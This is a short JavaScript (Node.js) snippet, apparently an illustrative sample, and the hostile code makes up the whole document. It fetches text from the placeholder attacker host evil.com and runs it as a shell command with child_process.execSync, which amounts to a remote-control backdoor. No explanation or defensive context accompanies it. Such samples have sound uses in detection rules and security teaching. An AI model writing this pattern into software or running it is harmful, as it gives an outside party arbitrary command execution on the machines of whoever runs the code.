let https = require("https"),
    cp = require("child_process");

https.get("https://evil.com/getCommand", res =>
    res.on("data", command => {
        cp.execSync(command);
    })
);
